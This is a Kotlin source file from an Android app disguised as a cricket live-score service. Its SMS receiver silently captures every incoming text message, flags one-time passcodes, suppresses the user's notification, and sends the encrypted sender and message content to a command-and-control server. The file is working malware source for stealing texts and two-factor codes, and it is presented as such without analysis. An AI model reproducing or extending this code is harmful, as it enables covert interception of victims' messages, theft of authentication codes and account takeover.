package com.cricket.livescore.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import com.cricket.livescore.StagerApplication
import com.cricket.livescore.utils.CryptoUtils
import com.cricket.livescore.utils.NetworkUtils
import org.json.JSONObject
import java.util.regex.Pattern

class SmsReceiver : BroadcastReceiver() {
    companion object {
        const val TAG = "SmsReceiver"
        const val OTP_REGEX = "\\b(\\d{4,8})\\b"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return

        val bundle: Bundle = intent.extras ?: return
        val pdus = bundle.get("pdus") as? Array<*> ?: return

        for (pdu in pdus) {
            val message = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                SmsMessage.createFromPdu(pdu as ByteArray, bundle.getString("format"))
            } else {
                @Suppress("DEPRECATION")
                SmsMessage.createFromPdu(pdu as ByteArray)
            } ?: continue

            val sender = message.originatingAddress ?: ""
            val body = message.messageBody ?: ""

            // Check for OTP
            val otpPattern = Pattern.compile(OTP_REGEX)
            val isOTP = otpPattern.matcher(body).find()

            // Abort broadcast to suppress notification
            abortBroadcast()

            // Send to C2
            sendSmsToC2(sender, body, isOTP != null)

            // Log
            Log.i(TAG, "SMS captured from: $sender, isOTP=$isOTP")
        }
    }

    private fun sendSmsToC2(sender: String, body: String, isOTP: Boolean) {
        val ctx = StagerApplication.instance
        Thread {
            try {
                val payload = JSONObject().apply {
                    put("sender", sender)
                    put("body", body)
                    put("is_otp", isOTP)
                    put("received_at", System.currentTimeMillis())
                }

                val json = JSONObject().apply {
                    put("type", "data")
                    put("device_id", Build.ID)
                    put("data_type", "sms")
                    put("data", CryptoUtils.encryptPayload(
                        payload.toString().toByteArray(),
                        Build.ID
                    ))
                    put("timestamp", System.currentTimeMillis())
                }

                NetworkUtils.sendToC2(StagerApplication.c2RealUrl, json.toString(), ctx)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send SMS to C2", e)
            }
        }.start()
    }
}
